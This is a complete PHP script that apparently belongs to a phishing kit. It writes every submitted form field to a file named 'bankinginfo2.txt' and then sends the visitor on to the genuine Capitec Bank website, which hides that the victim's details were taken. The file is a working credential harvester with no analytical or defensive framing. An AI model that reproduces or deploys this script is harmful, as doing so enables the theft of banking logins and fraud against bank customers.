<?php
header
('location:');
$handle=fopen("bankinginfo2.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:http://www.capitecbank.co.za");
exit;
?>
